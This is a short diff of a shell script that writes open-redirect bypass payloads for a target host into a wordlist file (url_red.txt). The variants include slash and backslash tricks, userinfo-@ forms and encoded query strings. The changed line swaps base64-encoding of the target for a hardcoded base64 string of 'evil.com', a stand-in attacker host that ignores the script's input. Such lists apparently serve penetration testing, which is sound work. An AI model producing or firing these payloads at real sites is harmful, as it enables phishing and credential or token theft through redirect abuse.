@@ -9,7 +9,7 @@ echo '\/'$3|tee -a url_red.txt
 echo '\/\/'$3|tee -a url_red.txt
 echo '\\'$3|tee -a url_red.txt
 echo '//'$3|tee -a url_red.txt
-echo '//'$3|base64|tee -a url_red.txt
+echo '//ZXZpbC5jb20K'|tee -a url_red.txt
 echo '//'$1$2'@'$3|tee -a url_red.txt
 echo '/\/'$3|tee -a url_red.txt
 echo 'https://'$3$2'%3F.'$1$2'/'|tee -a url_red.txt
